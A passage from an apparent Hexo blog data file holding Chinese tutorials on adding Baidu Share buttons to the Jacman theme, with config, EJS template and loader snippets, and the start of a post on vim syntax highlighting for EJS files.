<script>window._bd_share_config={\"common\":{\"bdSnsKey\":{},\"bdText\":\"\",\"bdMini\":\"1\",\"bdMiniList\":false,\"bdPic\":\"\",\"bdStyle\":\"0\",\"bdSize\":\"24\"},\"share\":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>\n<% } %>\n```\n\n### 5. 检测分享代码版本\n``` javascript\n//打开已安装分享代码的页面，在控制台中执行：\njavascript:b=(window.bdShare||window._bd_share_main);alert(b?'\\u5F53\\u524D\\u9875\\u9762\\u7684\\u5206\\u4EAB\\u4EE3\\u7801\\u7248\\u672C\\u4E3A\\uFF1A'+(b.version||'1.0'):'\\u5F53\\u524D\\u9875\\u9762\\u6CA1\\u6709\\u5B89\\u88C5\\u5206\\u4EAB\\u4EE3\\u7801\\u3002')\n```\n\n参见：[检测分享代码版本](http://share.baidu.com/code/advance#tools)\n\n\n## 三、分享效果展示\n分享按钮样式：\n![jiathis分享](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share.png)\n\n内容分享给QQ好友：\n![分享给QQ好友](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-qq.png)\n\n内容分享到微博：\n![分享到微博](http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-weibo.png)\n\n\n## 四、小结\n百度分享最大的一个优点在于更能提高在百度的搜索排名。另外，个人感觉百度分享生成代码过程更加友好。\n内容分享描述比较简单，仅仅只支持标题是硬伤。\n","slug":"article/hexo/jacman主题集成百度分享","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxqv001r5nbtakv5omgk","content":"<p><img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p>\n<h3 id=\"1-默认分享样式\"><a href=\"#1-默认分享样式\" class=\"headerlink\" title=\"1. 默认分享样式\"></a>1. 默认分享样式</h3><p>默认分享样式如下图所示：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png\" alt=\"默认分享\"></p>\n<h3 id=\"2-代码位置\"><a href=\"#2-代码位置\" class=\"headerlink\" title=\"2. 代码位置\"></a>2. 代码位置</h3><p>分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs<br>代码块：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"article-share\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"share\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"二、集成百度分享\"><a href=\"#二、集成百度分享\" class=\"headerlink\" title=\"二、集成百度分享\"></a>二、集成百度分享</h2><p>jacman主题默认不支持百度分享，只需要如下简单几步工作即可集成：</p>\n<h3 id=\"1-登录或注册百度\"><a href=\"#1-登录或注册百度\" class=\"headerlink\" title=\"1. 登录或注册百度\"></a>1. 登录或注册百度</h3><p>登录<a href=\"http://share.baidu.com/\" target=\"_blank\" rel=\"external\">百度分享</a>，完成登录或注册。</p>\n<h3 id=\"2-主题配置\"><a href=\"#2-主题配置\" class=\"headerlink\" title=\"2. 主题配置\"></a>2. 主题配置</h3><p>修改主题配置文件themes/jacman/_config.yml，如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">bdshare:</div><div class=\"line\">  enable: true ## if you use baidu share as your share tool,the built-in share tool won&apos;t be display.</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：enable前有二个空格(表示层级关系)，在代码里，可能通过theme.bdshare.enable获取其值。</p>\n<h3 id=\"3-代码逻辑\"><a href=\"#3-代码逻辑\" class=\"headerlink\" title=\"3. 代码逻辑\"></a>3. 代码逻辑</h3><p>代码：themes/jacman/layout/_partial/post/footer.ejs</p>\n<p>百度分享相关代码逻辑：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"article-share\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"share\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span>(<span class=\"attr\">theme.bdshare.enable</span>)&#123; %&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">bdshare</span>') %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; <span class=\"attr\">else</span> &#123; %&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span>(<span class=\"attr\">theme.jiathis.enable</span>)&#123; %&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"share-jiathis\"</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">jiathis</span>') %&gt;</span></div><div class=\"line\">         <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; <span class=\"attr\">else</span> &#123; %&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">data-url</span>=<span class=\"string\">\"&lt;%- item.permalink %&gt;\"</span> <span class=\"attr\">data-title</span>=<span class=\"string\">\"&lt;% if (item.title)&#123; %&gt;&lt;%= item.title %&gt; | &lt;% &#125; %&gt;&lt;%= config.title %&gt;\"</span> <span class=\"attr\">data-tsina</span>=<span class=\"string\">\"&lt;%= theme.author.tsina %&gt;\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"share clearfix\"</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>在原来theme.jiathis.enable代码块外层包一层theme.bdshare.enable判断，优先判断是否使用百度分享。</p>\n<p><strong>注</strong>：<code>&lt;%- partial(&#39;bdshare&#39;) %&gt;</code>语法表示加载当前目录下的bdshare.ejs文件。</p>\n<h3 id=\"4-百度分享模块\"><a href=\"#4-百度分享模块\" class=\"headerlink\" title=\"4. 百度分享模块\"></a>4. 百度分享模块</h3><p>代码：themes/jacman/layout/_partial/post/bdshare.ejs</p>\n<p>新建bdshare.ejs，并复制如下内容：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span> (<span class=\"attr\">theme.bdshare.enable</span>)&#123; %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bdsharebuttonbox\"</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_more\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"more\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_sqq\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"sqq\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到QQ好友\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_qzone\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"qzone\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到QQ空间\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_weixin\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"weixin\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到微信\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_tsina\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"tsina\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到新浪微博\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_renren\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"renren\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到人人网\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_count\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"count\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">window._bd_share_config=&#123;\"common\":&#123;\"bdSnsKey\":&#123;&#125;,\"bdText\":\"\",\"bdMini\":\"1\",\"bdMiniList\":false,\"bdPic\":\"\",\"bdStyle\":\"0\",\"bdSize\":\"24\"&#125;,\"share\":&#123;&#125;&#125;;with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"5-检测分享代码版本\"><a href=\"#5-检测分享代码版本\" class=\"headerlink\" title=\"5. 检测分享代码版本\"></a>5. 检测分享代码版本</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//打开已安装分享代码的页面，在控制台中执行：</span></div><div class=\"line\">javascript:b=(<span class=\"built_in\">window</span>.bdShare||<span class=\"built_in\">window</span>._bd_share_main);alert(b?<span class=\"string\">'\\u5F53\\u524D\\u9875\\u9762\\u7684\\u5206\\u4EAB\\u4EE3\\u7801\\u7248\\u672C\\u4E3A\\uFF1A'</span>+(b.version||<span class=\"string\">'1.0'</span>):<span class=\"string\">'\\u5F53\\u524D\\u9875\\u9762\\u6CA1\\u6709\\u5B89\\u88C5\\u5206\\u4EAB\\u4EE3\\u7801\\u3002'</span>)</div></pre></td></tr></table></figure>\n<p>参见：<a href=\"http://share.baidu.com/code/advance#tools\" target=\"_blank\" rel=\"external\">检测分享代码版本</a></p>\n<h2 id=\"三、分享效果展示\"><a href=\"#三、分享效果展示\" class=\"headerlink\" title=\"三、分享效果展示\"></a>三、分享效果展示</h2><p>分享按钮样式：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share.png\" alt=\"jiathis分享\"></p>\n<p>内容分享给QQ好友：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-qq.png\" alt=\"分享给QQ好友\"></p>\n<p>内容分享到微博：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-weibo.png\" alt=\"分享到微博\"></p>\n<h2 id=\"四、小结\"><a href=\"#四、小结\" class=\"headerlink\" title=\"四、小结\"></a>四、小结</h2><p>百度分享最大的一个优点在于更能提高在百度的搜索排名。另外，个人感觉百度分享生成代码过程更加友好。<br>内容分享描述比较简单，仅仅只支持标题是硬伤。</p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/hexo.png\" title=\"hexo\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>本文内容基于wuchong的Jacman主题。</p>\n<h3 id=\"1-默认分享样式\"><a href=\"#1-默认分享样式\" class=\"headerlink\" title=\"1. 默认分享样式\"></a>1. 默认分享样式</h3><p>默认分享样式如下图所示：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-default-share.png\" alt=\"默认分享\"></p>\n<h3 id=\"2-代码位置\"><a href=\"#2-代码位置\" class=\"headerlink\" title=\"2. 代码位置\"></a>2. 代码位置</h3><p>分享按钮位置：themes/jacman/layout/_partial/post/footer.ejs<br>代码块：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"article-share\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"share\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"二、集成百度分享\"><a href=\"#二、集成百度分享\" class=\"headerlink\" title=\"二、集成百度分享\"></a>二、集成百度分享</h2><p>jacman主题默认不支持百度分享，只需要如下简单几步工作即可集成：</p>\n<h3 id=\"1-登录或注册百度\"><a href=\"#1-登录或注册百度\" class=\"headerlink\" title=\"1. 登录或注册百度\"></a>1. 登录或注册百度</h3><p>登录<a href=\"http://share.baidu.com/\">百度分享</a>，完成登录或注册。</p>\n<h3 id=\"2-主题配置\"><a href=\"#2-主题配置\" class=\"headerlink\" title=\"2. 主题配置\"></a>2. 主题配置</h3><p>修改主题配置文件themes/jacman/_config.yml，如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">bdshare:</div><div class=\"line\">  enable: true ## if you use baidu share as your share tool,the built-in share tool won&apos;t be display.</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：enable前有二个空格(表示层级关系)，在代码里，可能通过theme.bdshare.enable获取其值。</p>\n<h3 id=\"3-代码逻辑\"><a href=\"#3-代码逻辑\" class=\"headerlink\" title=\"3. 代码逻辑\"></a>3. 代码逻辑</h3><p>代码：themes/jacman/layout/_partial/post/footer.ejs</p>\n<p>百度分享相关代码逻辑：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"article-share\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"share\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span>(<span class=\"attr\">theme.bdshare.enable</span>)&#123; %&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">bdshare</span>') %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; <span class=\"attr\">else</span> &#123; %&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span>(<span class=\"attr\">theme.jiathis.enable</span>)&#123; %&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"share-jiathis\"</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">jiathis</span>') %&gt;</span></div><div class=\"line\">         <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; <span class=\"attr\">else</span> &#123; %&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">data-url</span>=<span class=\"string\">\"&lt;%- item.permalink %&gt;\"</span> <span class=\"attr\">data-title</span>=<span class=\"string\">\"&lt;% if (item.title)&#123; %&gt;&lt;%= item.title %&gt; | &lt;% &#125; %&gt;&lt;%= config.title %&gt;\"</span> <span class=\"attr\">data-tsina</span>=<span class=\"string\">\"&lt;%= theme.author.tsina %&gt;\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"share clearfix\"</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>在原来theme.jiathis.enable代码块外层包一层theme.bdshare.enable判断，优先判断是否使用百度分享。</p>\n<p><strong>注</strong>：<code>&lt;%- partial(&#39;bdshare&#39;) %&gt;</code>语法表示加载当前目录下的bdshare.ejs文件。</p>\n<h3 id=\"4-百度分享模块\"><a href=\"#4-百度分享模块\" class=\"headerlink\" title=\"4. 百度分享模块\"></a>4. 百度分享模块</h3><p>代码：themes/jacman/layout/_partial/post/bdshare.ejs</p>\n<p>新建bdshare.ejs，并复制如下内容：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span> (<span class=\"attr\">theme.bdshare.enable</span>)&#123; %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bdsharebuttonbox\"</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_more\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"more\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_sqq\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"sqq\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到QQ好友\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_qzone\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"qzone\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到QQ空间\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_weixin\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"weixin\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到微信\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_tsina\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"tsina\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到新浪微博\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_renren\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"renren\"</span> <span class=\"attr\">title</span>=<span class=\"string\">\"分享到人人网\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"#\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"bds_count\"</span> <span class=\"attr\">data-cmd</span>=<span class=\"string\">\"count\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">window._bd_share_config=&#123;\"common\":&#123;\"bdSnsKey\":&#123;&#125;,\"bdText\":\"\",\"bdMini\":\"1\",\"bdMiniList\":false,\"bdPic\":\"\",\"bdStyle\":\"0\",\"bdSize\":\"24\"&#125;,\"share\":&#123;&#125;&#125;;with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> &#125; %&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"5-检测分享代码版本\"><a href=\"#5-检测分享代码版本\" class=\"headerlink\" title=\"5. 检测分享代码版本\"></a>5. 检测分享代码版本</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//打开已安装分享代码的页面，在控制台中执行：</span></div><div class=\"line\">javascript:b=(<span class=\"built_in\">window</span>.bdShare||<span class=\"built_in\">window</span>._bd_share_main);alert(b?<span class=\"string\">'\\u5F53\\u524D\\u9875\\u9762\\u7684\\u5206\\u4EAB\\u4EE3\\u7801\\u7248\\u672C\\u4E3A\\uFF1A'</span>+(b.version||<span class=\"string\">'1.0'</span>):<span class=\"string\">'\\u5F53\\u524D\\u9875\\u9762\\u6CA1\\u6709\\u5B89\\u88C5\\u5206\\u4EAB\\u4EE3\\u7801\\u3002'</span>)</div></pre></td></tr></table></figure>\n<p>参见：<a href=\"http://share.baidu.com/code/advance#tools\">检测分享代码版本</a></p>\n<h2 id=\"三、分享效果展示\"><a href=\"#三、分享效果展示\" class=\"headerlink\" title=\"三、分享效果展示\"></a>三、分享效果展示</h2><p>分享按钮样式：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share.png\" alt=\"jiathis分享\"></p>\n<p>内容分享给QQ好友：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-qq.png\" alt=\"分享给QQ好友\"></p>\n<p>内容分享到微博：<br><img src=\"http://7xkl4i.com1.z0.glb.clouddn.com/hexo-jacman-bdshare-share-weibo.png\" alt=\"分享到微博\"></p>\n<h2 id=\"四、小结\"><a href=\"#四、小结\" class=\"headerlink\" title=\"四、小结\"></a>四、小结</h2><p>百度分享最大的一个优点在于更能提高在百度的搜索排名。另外，个人感觉百度分享生成代码过程更加友好。<br>内容分享描述比较简单，仅仅只支持标题是硬伤。</p>\n"},{"title":"vim高亮显示ejs格式内容","date":"2016-02-16T03:51:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ejs.png\" title=\"ejs\" class=\"img-logo img-center\" />\n\n\n## 一、简介\n[官方介绍](http://www.embeddedjs.com/)如下：\n> EJS is a client-side templating language that was originally part of JavaScriptMVC, which has now been replaced by DoneJS.\n\n\n## 二、解决方法\n\n### 方法一 视ejs格式为html格式\n``` bash\nau BufNewFile,BufRead *.ejs set filetype=html\n```\n\n详细au命令参见：[AUTOCMD](http://vimcdoc.sourceforge.net/doc/autocmd.html)\n\n\n### 方法二 定制ejs格式语法高亮\n\n#### 1. 下载ejs语法文件\n下载ejs.vim文件到~/.vim/syntax/目录。\n下载地址：https://github.com/emilis/emilis-config/blob/master/.vim/syntax/ejs.vim\n\n文件内容如下：\n``` bash\nruntime! syntax/html.vim\nunlet b:current_syntax\n\n\" Include Java syntax\nsyn include @ejsJavaScript syntax/javascript.vim\n\nsyn region ejsScriptlet matchgroup=ejsTag start=/<%/  keepend end=/%>/ contains=@ejsJavaScript\nsyn region ejsExpr\tmatchgroup=ejsTag start=/<%=/ keepend end=/%>/ contains=@ejsJavaScript\n\n\" Redefine htmlTag so that it can contain jspExpr\nsyn clear htmlTag\nsyn region htmlTag start=+<[^/%]+ end=+>+ contains=htmlTagN,htmlString,htmlArg,htmlValue,htmlTagError,htmlEvent,htmlCssDefinition,@htmlPreproc,@htmlArgCluster,ejsExpr,javaScript\n\n\n\" syn keyword ejsPrint contained print\nsyn match javaScriptType        /\\<\\zsvars\\ze\\./\nsyn match javaScriptSpecial     /\\<\\zsexports\\ze\\./\nsyn match javaScriptFunction    /\\<\\zsprint\\ze(/\nsyn match javaScriptFunction    /\\<\\zsinclude\\ze(/\nsyn match javaScriptFunction    /\\<\\zsincludeObject\\ze(/\nsyn match javaScriptFunction    /\\<\\zsfetch\\ze(/\nsyn match javaScriptFunction    /\\<\\zsfetchObject\\ze(/\n\ncommand -nargs=+ HiLink hi def link <args>\nHiLink  ejsTag      htmlTag\ndelcommand HiLink\n\nlet b:current_syntax = \"ejs\"\n```\n\n#### 2. 设置ejs格式语法\n``` bash\n au BufNewFile,BufRead *.ejs set filetype=ejs\n```\n\n\n## 三、参考文档\n[Syntax highlight for .ejs files in vim](http://stackoverflow.com/questions/4597721/syntax-highlight-for-ejs-files-in-vim)\n","source":"_posts/article/hexo/vim高亮显示ejs格式内容.md","raw":"title: vim高亮显示ejs格式内容\ntags:\n  - hexo\n  - vim\ncategories:\n  - 博客搭建\ndate: 2016-02-16 11:51:00\n---\n\n<img src=\"/asserts/images/logo/ejs.png\" title=\"ejs\" class=\"img-logo img-center\" />\n\n\n## 一、简介\n[官方介绍](http://www.embeddedjs.com/)如下：\n> EJS is a client-side templating language that was originally part of JavaScriptMVC, which has now been replaced by DoneJS.\n\n\n## 二、解决方法\n\n### 方法一 视ejs格式为html格式\n``` 